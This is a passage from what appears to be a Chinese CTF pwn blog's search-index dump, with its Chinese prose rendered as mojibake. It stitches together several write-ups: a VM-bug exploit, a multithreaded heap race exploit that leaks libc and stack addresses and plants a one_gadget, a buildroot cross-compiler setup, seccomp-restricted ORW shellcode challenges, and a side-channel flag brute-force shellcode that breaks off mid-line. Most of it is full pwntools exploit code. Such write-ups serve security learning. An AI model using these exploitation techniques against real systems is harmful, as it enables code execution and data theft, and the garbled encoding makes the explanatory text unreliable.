rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\nå…ˆç»™ 0x201038 ä¸€ä¸ª libcï¼ˆ2ï¼‰ï¼Œç®— one_gadgetï¼ˆ7ï¼‰ä¿å­˜åˆ° 0x201040ï¼ˆ1ï¼‰ï¼Œå†ç®— exit_hookï¼ˆ6ï¼‰ï¼Œç”¨ï¼ˆ3ï¼‰å°† one_gadget èµ‹å€¼åˆ° 0x201038 çš„ exit_hook ä¸­ã€‚\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#p = process(&#x27;./easy_vm&#x27;)p = remote(&#x27;tcp.cloud.dasctf.com&#x27;,23804)libc = ELF(&#x27;./libc-2.23.so&#x27;)libc = 0x3c4b78exit1 = 0x5f0040 + 3848exit2 = 0x5f0040 + 3856one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]payload = p64(2)                    #libcpayload+= p64(7)                    payload+= p64(libc - one_gadget[3]) #calc_onegadgetpayload+= p64(1)                    #gadget_push_in_201040 payload+= p64(6)                    payload+= p64(exit1 - one_gadget[3])#calc_exit_hook payload+= p64(3)                    #gdb.attach(p)p.recvuntil(&#x27;Inputs your code:\\n&#x27;)p.sendline(payload)p.interactive()\nheap\nunsigned __int64 __fastcall sub_1732(char *a1)&#123;  int v2; // [rsp+10h] [rbp-120h]  int v3; // [rsp+14h] [rbp-11Ch]  const char *src; // [rsp+18h] [rbp-118h]  const char *srca; // [rsp+18h] [rbp-118h]  char dest[264]; // [rsp+20h] [rbp-110h] BYREF  unsigned __int64 v7; // [rsp+128h] [rbp-8h]  v7 = __readfsqword(0x28u);  src = strtok(a1, &quot;:&quot;);  if ( src )  &#123;    strcpy(a1, src);    srca = strtok(0LL, &amp;byte_21DA);    if ( srca )      strcpy(dest, srca);  &#125;  puts(&quot;The paper index loading&quot;);  v2 = atoi(a1);  v3 = *(_DWORD *)(*((_QWORD *)s + v2) + 8LL);  sleep(1u);   //ç«äº‰çª—å£  if ( (unsigned int)v2 &lt;= 0xF &amp;&amp; *((_QWORD *)s + v2) )  &#123;    printf(&quot;paper index: %d\\n&quot;, (unsigned int)v2);    puts(&quot;Input the new paper content&quot;);    strncpy(**((char ***)s + v2), dest, v3);    puts(&quot;Done&quot;);  &#125;  else  &#123;    puts(&quot;Invalid paper index&quot;);  &#125;  return v7 - __readfsqword(0x28u);&#125;\nå¤šçº¿ç¨‹æœªåŠ é”å¯¼è‡´ç«äº‰æ¡ä»¶ã€‚edit å­˜åœ¨ 1 ç§’çš„ç«äº‰çª—å£ï¼Œä¸”ç«äº‰çª—å£è¿‡åæ²¡æœ‰æ›´æ–° v3ã€‚åŒæ—¶æ²¡æœ‰é™åˆ¶å †å—å¤§å°ï¼Œå¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§chunk1åœ¨ç«äº‰çª—å£ä¸­freeæ‰chunk1ï¼ŒåŒæ—¶ç”³è¯·å°å †å—chunk2æ­¤æ—¶å¯ä»¥å¯¹chunk2è¿›è¡Œæº¢å‡º\nint __fastcall sub_1469(const char *a1)&#123;  int result; // eax  int i; // [rsp+10h] [rbp-10h]  int v3; // [rsp+14h] [rbp-Ch]  _DWORD *v4; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15 &amp;&amp; *((_QWORD *)s + i); ++i )    ;  if ( i == 16 )    return puts(&quot;paper pool is full&quot;);  v3 = strlen(a1);  if ( v3 &lt;= 79 || v3 &gt; 104 )    return puts(&quot;paper size error&quot;);  v4 = malloc(0x10uLL);  *(_QWORD *)v4 = malloc(v3);  v4[2] = v3;  printf(&quot;creating paper with index %d\\n&quot;, (unsigned int)i);  puts(&quot;Input the paper content&quot;);  strncpy(*(char **)v4, a1, v3);  puts(&quot;Done&quot;);  result = (int)v4;  *((_QWORD *)s + i) = v4;  return result;&#125;\næº¢å‡ºå¯¹è±¡æ˜¯ä¿å­˜å †å—åœ°å€çš„å°å †å—,ä¹Ÿå°±æ˜¯è¿™é‡Œçš„v4å› ä¸ºeditç”¨çš„æ˜¯\nstrncpy(*(char **)v4, a1, v3);\næˆ‘ä»¬è¦æ³¨æ„æº¢å‡ºç©ºé—´ä¸èƒ½è¿‡å¤§ï¼Œä»¥å…ç ´åå…¶ä»–æ•°æ®\né¦–å…ˆæ³„æ¼ libc åœ°å€ã€‚çº¿ç¨‹çš„å †å—éƒ½åˆ†é…è‡³å•ç‹¬çš„çº¿ç¨‹å † ï¼ˆå †åœ°å€ä»¥ 0x7f å¼€å¤´ï¼‰ï¼Œarena çš„ä½ç½®å°±ä½äºå †ç©ºé—´ä¸Šæ–¹ï¼Œæ‰€ä»¥åªè¦æº¢å‡ºä¿®æ”¹ ptr ä½ä½å°±å¯ä»¥å°†å…¶æŒ‡å‘ arenaï¼Œä»è€Œæ³„æ¼ arena ä¸Šçš„ libc åœ°å€ï¼ˆæ³„æ¼å‡ºæ¥çš„åœ°å€æ°å¥½æ˜¯ main arena åœ°å€ï¼‰ã€‚\ngetshell æ–¹æ³•æ˜¯æ³„æ¼ libc ä¸Šçš„æ ˆåœ°å€ï¼Œç„¶åå°†æ ˆä¸Šçš„ main å‡½æ•°è¿”å›åœ°å€ä¿®æˆ one gadget åœ°å€ã€‚libc ä¸Šæœ‰ä¸¤å¤„åœ°æ–¹å¯ä»¥æ³„æ¼æ ˆåœ°å€ï¼Œ__environ å’Œ __libc_argvï¼Œè¿™é“é¢˜åªèƒ½ä½¿ç”¨åè€…ï¼Œå› ä¸ºå‰è€…åœ°å€çš„æœ€ä½ä½æ°å¥½æ˜¯ç©ºå­—èŠ‚ã€‚\næ ˆéœ€è¦ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯å‰é¢æåˆ°çš„ main å‡½æ•°è¿”å›åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯ main å‡½æ•°çš„ saved rbpã€‚ä¿®æ”¹ saved rbp æ˜¯ä¸ºäº†æ»¡è¶³ one gadget åˆ©ç”¨æ¡ä»¶ï¼ˆä¸‹å›¾è¿™ä¸ªï¼‰ï¼ŒåŸæ¥çš„ saved rbp æ˜¯æ•°å€¼ 1ï¼Œéœ€è¦æŠŠå®ƒæ”¹æˆä»»æ„ä¸€ä¸ªå¯å†™å†…å­˜åœ°å€ã€‚\n0xebdb3 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])constraints:  address rbp-0x50 is writable  [rbp-0x50] == NULL || rbp-0x50 == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL\n\nfrom pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)import timecontext(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p= process(&#x27;./heap&#x27;)elf = ELF(&#x27;./heap&#x27;)#p = remote(&quot;tcp.cloud.dasctf.com&quot;, 21479)libc = ELF(&quot;./libc-3.35.so&quot;)sla      = lambda x, y : p.sendlineafter(y, str(x) if not isinstance(x, bytes) else x) sl       = lambda x : p.sendline(str(x) if not isinstance(x, bytes) else x)sa       = lambda x, y : p.sendafter(y, str(x) if not isinstance(x, bytes) else x)   def add(ctx):    sla(f&quot;1 &#123;ctx&#125;&quot;, &quot;Your chocie:&quot;)    def show(ctx):    sla(f&quot;2 &#123;ctx&#125;&quot;, &quot;Your chocie:&quot;)def edit(idx, ctx):    pp = b&quot;3 &quot; + str(idx).encode() + b&quot;:&quot; + ctx    sla(pp, &quot;Your chocie:&quot;)def edit_no(idx, ctx):    pp = b&quot;3 &quot; + str(idx).encode() + b&quot;:&quot; + ctx    sl(pp)def free(idx):    sla(f&quot;4 &#123;idx&#125;&quot;, &quot;Your chocie:&quot;)    def free_no(idx):    sl(f&quot;4 &#123;idx&#125;&quot;)add(&quot;A&quot;*0x50) #chunk0add(&quot;B&quot;*0x68)add(&quot;C&quot;*0x61)add(&quot;a&quot;*0x50) #chunk3add(&quot;b&quot;*0x68)add(&quot;c&quot;*0x62)add(&quot;1&quot;*0x50) #chunk6add(&quot;2&quot;*0x68)add(&quot;3&quot;*0x66)add(&quot;1&quot;*0x50) #chunk9add(&quot;2&quot;*0x68)add(&quot;3&quot;*0x66)free(0)edit(2, b&quot;X&quot;*0x60+b&quot;\\x80&quot;)free(2)add(&quot;C&quot;*0x61) #chunk0add(&quot;A&quot;*0x50) #chunk2time.sleep(3)free(3)edit(5, b&quot;x&quot;*0x60+b&quot;\\xa0\\x08&quot;)free(5)add(&quot;c&quot;*0x62) #chunk3add(&quot;a&quot;*0x50) #chunk5time.sleep(3)show(4)p.recvuntil(&quot;paper content: &quot;)libc.address = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x219c80success(&quot;libcbase: 0x%lx&quot;, libc.address)p_stack = libc.address + 0x21aa20edit_no(1, p64(p_stack)[:6])time.sleep(3)show(0)p.recvuntil(&quot;paper content: &quot;)stack = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))main_ret_addr = stack-0x110success(&quot;stackbase: 0x%lx&quot;, libc.address)success(&quot;main ret address ptr: 0x%lx&quot;, main_ret_addr)free_no(6)edit(8, b&quot;0&quot;*0x60+p64(main_ret_addr-8)[:6])free(8)add(&quot;3&quot;*0x66) #chunk3add(&quot;1&quot;*0x50) #chunk5time.sleep(3)writable_ptr_b = p64(libc.address + 0x21c240)edit(7, writable_ptr_b[:6])free_no(9)edit(11, b&quot;0&quot;*0x60+p64(main_ret_addr)[:6])free(11)add(&quot;3&quot;*0x66) #chunk3add(&quot;1&quot;*0x50) #chunk5time.sleep(3)one_gadget_b =p64(libc.address + 0xEBD48)edit(10, one_gadget_b[:6])time.sleep(3)p.sendline(&quot;5&quot;)p.interactive()","categories":["wp"]},{"title":"äº¤å‰ç¼–è¯‘ç¯å¢ƒçš„æ­å»º","url":"/2024/03/22/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/","content":"å»å¹´ç¾ŠåŸæ¯ç¬¬ä¸€æ¬¡å¼€å§‹æå¼‚æ„çš„åˆ†æå‰ä¸¤å¤©åœ¨æ•´ç†ç¯å¢ƒçš„æ—¶å€™å°±æƒ³ç€æ€»ç»“ä¸€ä¸‹\n//å®‰è£…ä¾èµ–åº“sudo apt-get updatesudo apt-get install libncurses5-dev patch //ä¸‹è½½æºç git clone https://github.com/buildroot/buildroot.git //è¿›è¡Œç¼–è¯‘çš„é…ç½®cd buildrootmake cleanmake menuconfig\nmake menuconfig ä¹‹åä¼šå‡ºæ¥ä¸€ä¸ªèœå•åœ¨toolchainé‡Œé€‰æ‹©ä½ éœ€è¦ç¼–è¯‘çš„ç¯å¢ƒç„¶ååœ¨ä¸‹æ–¹Kernel Headersé€‰æ‹©ä½ çš„linuxå†…æ ¸ç‰ˆæœ¬å†…æ ¸ç‰ˆæœ¬æŸ¥çœ‹ï¼š\nuname -r\n.é€€å‡ºåå°±å¯ä»¥makeäº†ï¼Œæ³¡ä¸ªèŒ¶å¼€æ‘†ï¼‰ æ³¨æ„ä¿æŒç½‘ç»œç•…é€šï¼Œå¯èƒ½ä¼šä¸‹è½½ä¸€äº›ä¾èµ–\nmakeå®Œæˆåå°±å¯ä»¥ç¼–è¯‘äº†ï¼Œç¼–è¯‘å™¨çš„ç›®å½•\ncd /buildroot/output/host/usr/bin./riscv64-linux-gcc your_c_programm.c\n","categories":["plays"],"tags":["plays"]},{"title":"æ‹¿ä¸åˆ°shellçš„shellcode","url":"/2023/08/01/%E6%8B%BF%E4%B8%8D%E5%88%B0shell%E7%9A%84shellcode/","content":"Shell we talk?Shall we talk?seccomp-toolsä¸‹è½½\nsudo apt install gcc ruby-devgem install seccomp-tools\nThe arts of shellcodeå±±æµ·å…³å·¨ä½¬çš„åšå®¢ï¼šhttps://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode/1. [HGAME 2023 week1]simple_shellcodechecksecï¼š\n[*] &#x27;/var/run/vmblock-fuse/blockdir/4JPOf1/vuln&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nsandbox:    \nroot@ubuntu:/home/str1k3/Desktop# seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/U0Wns2/vuln&#x27; line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0004: 0x06 0x00 0x00 0x00000000  return KILL\nä¿æŠ¤å…¨å¼€ï¼Œæ²™ç›’ç¦ç”¨äº†systemï¼Œè€ƒè™‘orw\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init();  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);  puts(&quot;Please input your shellcode:&quot;);  read(0, (void *)0xCAFE0000LL, 0x10uLL);  sandbox();  MEMORY[0xCAFE0000]();  return 0;&#125;\nåŠ¨è°ƒçœ‹åˆ°æœ‰ä¸€æ®µæƒé™éƒ½æœ‰çš„åœ°å€ï¼Œå¯ä¾›å†™å…¥shellcodeã€‚0x10çš„é•¿åº¦ä¸å¤Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰‹æ“shellcodeæ¥callä¸€ä¸ªreadï¼Œä»¥æ­¤å†™å…¥orwçš„shellcodeã€‚\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA             Start                End Perm     Size Offset File        0xcafe0000         0xcafe1000 rwxp     1000      0 /dev/zero (deleted) ***    0x555555554000     0x555555555000 r--p     1000      0 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555555000     0x555555556000 r-xp     1000   1000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555556000     0x555555557000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555557000     0x555555558000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555558000     0x555555559000 rw-p     1000   3000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x7ffff7dc4000     0x7ffff7de6000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7de6000     0x7ffff7f5e000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7f5e000     0x7ffff7fac000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fac000     0x7ffff7fb0000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb0000     0x7ffff7fb2000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb2000     0x7ffff7fb8000 rw-p     6000      0 [anon_7ffff7fb2]    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\næŠŠæ–­ç‚¹ä¸‹åˆ°æ‰§è¡Œshellcodeå‰çš„åœ°æ–¹çœ‹çœ‹å¯„å­˜å™¨\n RAX  0x0 RBX  0x5555555553d0 (__libc_csu_init) â—‚â€” endbr64  RCX  0x7ffff7ee3d3e (prctl+14) â—‚â€” cmp rax, -0xfff RDX  0xcafe0000 â—‚â€” xor dword ptr [rcx], esi /* 0xa343135343131; &#x27;114514\\n&#x27; */ RDI  0x16 RSI  0x2 R8   0x0 R9   0x0 R10  0x7ffff7ee3d3e (prctl+14) â—‚â€” cmp rax, -0xfff R11  0x217 R12  0x555555555100 (_start) â—‚â€” endbr64  R13  0x7fffffffe3f0 â—‚â€” 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffe300 â—‚â€” 0x0 RSP  0x7fffffffe2f0 â€”â–¸ 0x7fffffffe3f0 â—‚â€” 0x1*RIP  0x5555555553b9 (main+131) â—‚â€” call rdx\nread(0,0xcafe0000+xï¼ˆåœ°å€ï¼‰,0x1000(é•¿åº¦))åœ¨ç³»ç»Ÿè°ƒç”¨ä¸­å°±æ˜¯rax=0,rdi=0,rsi = 0xcafe0000+xï¼ˆåœ°å€ï¼‰rdx=0x1000(é•¿åº¦)é‚£ä¹ˆæˆ‘ä»¬å¯¹ç…§ä¸Šé¢çš„å¯„å­˜å™¨åœ°å€å°±å¯ä»¥æ„é€ ç¬¬ä¸€ä¸ªpayloadé¦–å…ˆrax=0 ä¸ç”¨æ”¹å˜ï¼Œå…ˆæŠŠrdiå˜æˆ0 ç„¶åå†æŠŠrsi=0xCAFE0010,rdxæœ¬èº«å°±å¤Ÿå¤§äº† ä¹Ÿä¸ç”¨æ”¹å˜shellcode=asm(&quot;&quot;&quot; mov rdi,rax mov rsi,0xCAFE0010 syscall nop &quot;&quot;&quot;) æˆ– çœ‹readçš„æ±‡ç¼–   0x55555555538b &lt;main+85&gt;     mov    rax, qword ptr [rbp - 8]   0x55555555538f &lt;main+89&gt;     mov    edx, 0x10   0x555555555394 &lt;main+94&gt;     mov    rsi, rax   0x555555555397 &lt;main+97&gt;     mov    edi, 0   0x55555555539c &lt;main+102&gt;    mov    eax, 0   0x5555555553a1 &lt;main+107&gt;    call   read@plt                &lt;read@plt&gt;æŠŠeaxå’Œediæ¸…é›¶ï¼ŒæŠŠedxå˜å¾—è¶³å¤Ÿå¤§ï¼ŒæŠŠesiæ”¹æˆè¦å†™å…¥çš„ä½ç½®ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°åŒæ ·çš„è°ƒç”¨æ•ˆæœ      shellcode1 = asm(&quot;&quot;&quot; xor eax, eax /* SYS_read */ xor edi, edi /* 0 */ mov edx, 0x1000 mov esi, 0xcafe0000 syscall &quot;&quot;&quot;)è°ƒç”¨å®Œreadä¹‹åæ‰¾ä¸€æ®µorwçš„shellcodeè¾“è¿›å»å³å¯shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)  æˆ–åˆ©ç”¨shellcraftshellcode2 = b&quot;\\x90&quot; * 0x100  # å¡«å……100ä¸ªnopæŒ‡ä»¤shellcode2 += asm(shellcraft.open(&quot;/flag&quot;))shellcode2 += asm(shellcraft.read(3, 0xCAFE0500, 0x500))shellcode2 += asm(shellcraft.write(1, 0xCAFE0500, 0x500))\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p=process(&#x27;./vuln&#x27;)p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28311)shellcode1=asm(&#x27;&#x27;&#x27; mov rdi,rax; mov rsi,0xCAFE0010; syscall; nop; &#x27;&#x27;&#x27;)p.sendafter(&quot;Please input your shellcode:\\n&quot;,shellcode1)shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)p.send(shellcode2)print(p.recv())print(p.recv())\n\n2. [GDOUCTF 2023]Randomå¼€äº†æ²™ç›’\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100åˆ°0x60200è¿™æ®µå†…å­˜å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œæ‰€ä»¥å°è¯•æŠŠshellcodeå†™å…¥è¿™æ®µåå°†æ‰§è¡ŒæµåŠ«æŒåˆ°è¯¥æ®µhahaå‡½æ•°å†…å­˜åœ¨jmp rspæŒ‡ä»¤\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# è¿æ¥è¿œç¨‹p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# åŠ è½½randå‡½æ•°çš„æ‰€åœ¨å‡½æ•°åº“libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#è®¾ç½®srandå‡½æ•°jmp_sp = 0x40094Edata_addr = 0x601000#é€šè¿‡éšæœºæ•°éªŒè¯  ç¨‹åºä¼šè·³è½¬åˆ°vulnerableå‡½æ•°p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;åˆ©ç”¨ jmp_sp + asm çš„æ”»å‡»æ–¹å¼  è®©spæŒ‡é’ˆè·³å›å˜é‡åœ°å€ æ‰§è¡Œshellcode:     åœ¨data_addr 0x601000 å†™å…¥orw_shellcodeå    å¹¶è·³è½¬æ‰§è¡Œdata_addr 0x12300çš„orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#è°ƒç”¨readå‡½æ•° åœ¨data_addr 0x601000å¤„å†™å…¥ orw_shellcodeå†…å®¹payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#å¹¶ä¸”call axå¯„å­˜å™¨ è°ƒç”¨æ‰§è¡Œ data_addr 0x601000å¤„çš„orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#æ‰“æ»¡å˜é‡ç©ºé—´ å’Œ rbpå¯„å­˜å™¨çš„å­—èŠ‚payload+=p64(jmp_sp)#è¿”å›åœ°å€å†™æˆjmp_espï¼Œç»§ç»­è¿è¡Œå½“å‰spåç»­æŒ‡ä»¤ å¡«å†™åˆ«çš„è¿”å›åœ°å€ å°±æ— æ³•æ§åˆ¶ç¨‹åºåé¢çš„æ‰§è¡Œæµç¨‹äº†payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#æ­¤æ—¶spå·²ç»ç¦»shellcodeåœ°å€åç§»0x30,è¿™é‡ŒæŠŠspæŒªå›åˆ°shellcodeåœ°å€ å¹¶è·³è½¬åˆ°shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcodeæ‰§è¡Œçš„å†…å®¹:æ‰“å¼€æœ¬åœ°çš„flagæ–‡ä»¶ æŠŠflagæ–‡ä»¶å†…å®¹å†™å…¥åˆ° data_addr+0x100æŠŠè¾“å‡ºdata_addr+0x100çš„flagæ–‡ä»¶å†…å®¹&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#æ‰“å¼€æœ¬åœ°çš„flagæ–‡ä»¶orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#æ–‡ä»¶æè¿°ç¬¦3:å…¶å®ƒæ‰“å¼€çš„æ–‡ä»¶ flagå†…å®¹å†™å…¥åˆ°data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#æ–‡ä»¶æè¿°ç¬¦1:è¾“å‡º  åœ°å€data_addr+0x100å­˜å‚¨çš„flagå†…å®¹p.send(asm(orw_shellcode))p.interactive()\n\nåŸºäºå †æ¼æ´çš„orwå¯ä»¥çœ‹setcontext\n","categories":["stack"],"tags":["shellcode"]},{"title":"ä¾§ä¿¡é“çˆ†ç ´","url":"/2024/05/07/%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4/","content":"ä¾§ä¿¡é“æ”»å‡»ï¼ˆSide-Channel Attackï¼ŒSCAï¼‰æ˜¯ä¸€ç§åˆ©ç”¨ç‰©ç†å®ç°çš„ä¿¡æ¯æ³„éœ²æ¥è·å–æ•æ„Ÿä¿¡æ¯çš„æ”»å‡»æ–¹å¼ã€‚è¿™ç§æ”»å‡»ä¸ç›´æ¥æ”»å‡»åŠ å¯†ç®—æ³•æœ¬èº«ï¼Œè€Œæ˜¯é€šè¿‡åˆ†æç³»ç»Ÿçš„ç‰©ç†å®ç°ï¼ˆå¦‚ç¡¬ä»¶è®¾å¤‡ï¼‰åœ¨æ‰§è¡ŒåŠ å¯†æ“ä½œæ—¶çš„æŸäº›å¯è§‚æµ‹çš„ç‰©ç†é‡ï¼ˆå¦‚æ—¶é—´ã€åŠŸè€—ã€ç”µç£æ³„æ¼ç­‰ï¼‰æ¥è·å–ä¿¡æ¯ã€‚\nä¾§ä¿¡é“æ”»å‡»çš„å¸¸è§ç±»å‹åŒ…æ‹¬ï¼š\næ—¶åºæ”»å‡»ï¼ˆTiming Attackï¼‰ï¼šé€šè¿‡æµ‹é‡è®¡ç®—æˆ–æ“ä½œçš„æ—¶é—´æ¥è·å–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¯†ç å­¦æ“ä½œä¸­çš„åŠ å¯†æˆ–è§£å¯†æ“ä½œå¯èƒ½å› ä¸ºè¾“å…¥çš„ä¸åŒè€Œå¯¼è‡´æ‰§è¡Œæ—¶é—´ä¸Šçš„å·®å¼‚ã€‚åŠŸè€—åˆ†ææ”»å‡»ï¼ˆPower Analysis Attackï¼‰ï¼šé€šè¿‡åˆ†æè®¾å¤‡çš„åŠŸè€—å˜åŒ–æ¥è·å–æ‰§è¡Œçš„æ“ä½œä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯åœ¨åŠ å¯†è®¾å¤‡ä¸Šã€‚ç”µç£æ³„æ¼æ”»å‡»ï¼ˆElectromagnetic Emanation Attackï¼‰ï¼šé€šè¿‡æ•æ‰è®¾å¤‡å‘å‡ºçš„ç”µç£è¾å°„æ¥è·å–ä¿¡æ¯ã€‚å£°å­¦æ”»å‡»ï¼ˆAcoustic Attackï¼‰ï¼šé€šè¿‡åˆ†æè®¾å¤‡å‘å‡ºçš„å£°éŸ³æ¥è·å–ä¿¡æ¯ã€‚é”™è¯¯æ³¨å…¥æ”»å‡»ï¼ˆFault Injection Attackï¼‰ï¼šé€šè¿‡å¼•å…¥é”™è¯¯ï¼ˆå¦‚ç”µå‹å¹²æ‰°ã€æ¿€å…‰ç…§å°„ç­‰ï¼‰æ¥ç ´åæ­£å¸¸çš„æ‰§è¡Œæµç¨‹ï¼Œä»è€Œè·å–ä¿¡æ¯ã€‚\nåœ¨pwné¢˜ä¸­ä¸€èˆ¬ä½¿ç”¨ä¾§ä¿¡é“çˆ†ç ´flagä¾§ä¿¡é“çˆ†ç ´é€‚ç”¨äºorwæ— wçš„æƒ…å†µï¼Œå³ç¨‹åºåªå…è®¸openå’Œreadã€‚ä¸€èˆ¬æ¥è¯´é¢˜ç›®èƒ½å¤Ÿæ‰§è¡Œshellcode\n[è“å¸½æ¯2021 slient]ä¿æŠ¤å…¨å¼€åªå…è®¸openå’Œreadè¿™ä¸ªæ²™ç›’ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦sudoæ‰èƒ½æŸ¥åˆ°ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ï¼šè¾“å…¥å•¥å°±æ‰§è¡Œå•¥,mmapåœ¨0x1000å¼€äº†ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ç©ºé—´è¿™é‡Œé€šè¿‡æ¯”è¾ƒç¼“å†²åŒºä¸­flagçš„æ¯ä¸€ä½ï¼Œç›¸åŒåˆ™è¿›å…¥å¾ªç¯ã€‚é€šè¿‡ç¨‹åºæ˜¯å¦è¿›å…¥exitæ¥åˆ¤æ–­flagè¯¥ä½æ­£ç¡®ä¸å¦shellcode:\ndef exp(dis,char):    p.recvuntil(b&quot;Welcome to silent execution-box.\\n&quot;)    shellcode = asm(&#x27;&#x27;&#x27;        mov r12,0x67616c66     ;al:rax å¯„å­˜å™¨çš„ä½ 8 ä½        push r12               ;cl:rcx å¯„å­˜å™¨çš„ä½ 8 ä½        mov rdi,rsp            ;dl:rdx å¯„å­˜å™¨çš„ä½ 8 ä½        xor esi,esi        xor edx,edx        mov al,2        syscall                 ;open(&#x27;./flag&#x27;)                            mov rdi,rax        mov rsi,0x10700        mov dl,0x40        xor rax,rax        syscall                 ;read(0,0x10700,0x40)                            mov dl, byte ptr [rsi+&#123;&#125;]  ; å°†ç¼“å†²åŒºä¸­çš„æŸä¸ªå­—èŠ‚åŠ è½½åˆ°å¯„å­˜å™¨ dl        mov cl, &#123;&#125;             ; å°†è¾“å…¥å‚æ•° char åŠ è½½åˆ°å¯„å­˜å™¨ cl        cmp 